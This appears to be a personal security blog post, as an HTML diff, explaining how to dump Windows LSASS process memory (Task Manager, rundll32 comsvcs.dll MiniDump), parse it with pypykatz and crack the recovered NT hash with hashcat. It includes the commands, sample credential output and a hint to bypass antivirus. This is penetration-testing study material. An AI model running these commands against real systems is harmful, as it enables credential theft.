@@ -1,0 +1,313 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Attacking Windows LSASS | v1pa0z Blog</title>
+  <meta name="author" content="mag">
+  
+  <meta name="description" content="my personal blog">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Attacking Windows LSASS"/>
+  <meta property="og:site_name" content="v1pa0z Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="v1pa0z Blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">v1pa0z Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Attacking Windows LSASS</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p><img src="/../images/mimikatz1.png" alt="alt text"></p>
+<hr>
+<h1 id="Overview-on-LSASS"><a href="#Overview-on-LSASS" class="headerlink" title="Overview on LSASS"></a>Overview on LSASS</h1><p>In addition to acquiring copies of the SAM database to extract and crack password hashes, we will also benefit from targeting the <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service">Local Security Authority Subsystem Service (LSASS)</a>.</p>
+<p>Upon initial logon, LSASS will:</p>
+<ul>
+<li>Cache credentials locally in memory</li>
+<li>Create <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens">access tokens</a></li>
+<li>Enforce security policies</li>
+<li>Write to Windows’ <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security">security log</a><br>Let’s cover some of the techniques and tools we can use to dump LSASS memory and extract credentials from a target running Windows.</li>
+</ul>
+<h2 id="Securable-Objects"><a href="#Securable-Objects" class="headerlink" title="Securable Objects"></a>Securable Objects</h2><p>In Windows, <strong>securable objects</strong> are resources that the operating system protects through <strong>Access Control Lists (ACLs)</strong> and other security mechanisms. These objects can have permissions assigned to users or groups, allowing or denying access.</p>
+<h2 id="LSASS-Process-Memory-dump"><a href="#LSASS-Process-Memory-dump" class="headerlink" title="LSASS Process Memory dump"></a>LSASS Process Memory dump</h2><p>Similar to the process of attacking the SAM database, it would be wise for us first to create a copy of the contents of LSASS process memory via the generation of a memory dump. Creating a dump file lets us extract credentials offline using our attack host. K</p>
+<h3 id="Through-task-manager"><a href="#Through-task-manager" class="headerlink" title="Through task manager"></a>Through task manager</h3><ol>
+<li>Open <code>Task Manager</code></li>
+<li>Select the <code>Processes</code> tab</li>
+<li>Find and right click the <code>Local Security Authority Process</code></li>
+<li>Select <code>Create dump file</code><br><img src="/../images/lasas.png" alt="alt text"><br>A file called <code>lsass.DMP</code> is created and saved in <code>%temp%</code>. This is the file we will transfer to our attack host.<br><img src="/%22/images/lsassexe_diagram.webp%22" alt="alt text"></li>
+</ol>
+<h1 id="Through-rundll32"><a href="#Through-rundll32" class="headerlink" title="Through rundll32"></a>Through rundll32</h1><p>This way is faster than the Task Manager method and more flexible because we may gain a shell session on a Windows host with only access to the command line. It is important to note that modern anti-virus tools recognize this method as malicious activity.</p>
+<p>Before issuing the command to create the dump file, we must determine what process ID (<code>PID</code>) is assigned to <code>lsass.exe</code>. This can be done from cmd or PowerShell:</p>
+<p>Finding LSASS’s PID in cmd</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; tasklist /svc</span><br></pre></td></tr></table></figure>
+
+<p>Finding LSASS’s PID in  powershell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">system32&gt; Get-Process lsass</span><br><span class="line"></span><br><span class="line">ID</span><br><span class="line">672</span><br></pre></td></tr></table></figure>
+<p>Creating a dump file using PowerShell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system32&gt; rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full</span><br></pre></td></tr></table></figure>
+
+<p>that most modern AV tools recognize this as malicious activity and prevent the command from executing. In these cases, we will need to consider ways to bypass or disable the AV tool we are facing</p>
+<p>With this command, we are running <code>rundll32.exe</code> to call an exported function of <code>comsvcs.dll</code> which also calls the MiniDumpWriteDump (<code>MiniDump</code>) function to dump the LSASS process memory to a specified directory (<code>C:\lsass.dmp</code>).</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">extract hashes</span><br><span class="line">$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp </span><br></pre></td></tr></table></figure>
+<h1 id="LSA-Inners-dumped-content"><a href="#LSA-Inners-dumped-content" class="headerlink" title="LSA Inners (dumped content)"></a>LSA Inners (dumped content)</h1><h4 id="MSV"><a href="#MSV" class="headerlink" title="MSV"></a>MSV</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sid S-1-5-21-4019466498-1700476312-3544718034-1001</span><br><span class="line">luid 1354633</span><br><span class="line">	== MSV ==</span><br><span class="line">		Username: bob</span><br><span class="line">		Domain: DESKTOP-33E7O54</span><br><span class="line">		LM: NA</span><br><span class="line">		NT: 64f12cddaa88057e06a81b54e73b949b</span><br><span class="line">		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8</span><br><span class="line">		DPAPI: NA</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package">MSV</a> is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database. </p>
+<h4 id="WDIGEST"><a href="#WDIGEST" class="headerlink" title="WDIGEST"></a>WDIGEST</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">== WDIGEST [14ab89]==</span><br><span class="line">	username bob</span><br><span class="line">	domainname DESKTOP-33E7O54</span><br><span class="line">	password None</span><br><span class="line">	password (hex)</span><br></pre></td></tr></table></figure>
+
+<p><code>WDIGEST</code> is an older authentication protocol enabled by default in <code>Windows XP</code> - <code>Windows 8</code> and <code>Windows Server 2003</code> - <code>Windows Server 2012</code>. LSASS caches credentials used by WDIGEST in clear-text.</p>
+<h4 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">== Kerberos ==</span><br><span class="line">	Username: bob</span><br><span class="line">	Domain: DESKTOP-33E7O54</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://web.mit.edu/kerberos/#what_is">Kerberos</a> is a network authentication protocol used by Active Directory in Windows Domain environments.<br>Domain user accounts are granted tickets upon authentication with Active Directory. This ticket is used to allow the user to access shared resources on the network that they have been granted access to without needing to type their credentials each time.<br>LSASS caches <code>passwords</code>, <code>ekeys</code>, <code>tickets</code>, and <code>pins</code> associated with Kerberos</p>
+<h4 id="DPAPI"><a href="#DPAPI" class="headerlink" title="DPAPI"></a>DPAPI</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">== DPAPI [14ab89]==</span><br><span class="line">		luid 1354633</span><br><span class="line">		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b</span><br><span class="line">		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92</span><br><span class="line">		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605</span><br></pre></td></tr></table></figure>
+<p>Mimikatz and Pypykatz can extract the DPAPI <code>masterkey</code> for logged-on users whose data is present in LSASS process memory. These masterkeys can then be used to decrypt the secrets associated with each of the applications using DPAPI and result in the capturing of credentials for various accounts. covered in privEsc</p>
+<h1 id="crack-nt-hash"><a href="#crack-nt-hash" class="headerlink" title="crack nt hash"></a>crack nt hash</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+
+	  <div class="article-footer-copyright">
+
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2025/07/08/Dumpin Registery Hives/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2025/06/20/HTB-Writing custom wordlists using hashcat and cuppy/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2025-07-08 
+	</div>
+	
+
+	<!-- categories -->
+    
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/lsass/">lsass<span>1</span></a></li> <li><a href="/tags/secretsdump/">secretsdump<span>1</span></a></li> <li><a href="/tags/mimikatz/">mimikatz<span>2</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 mag's Blog
+  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
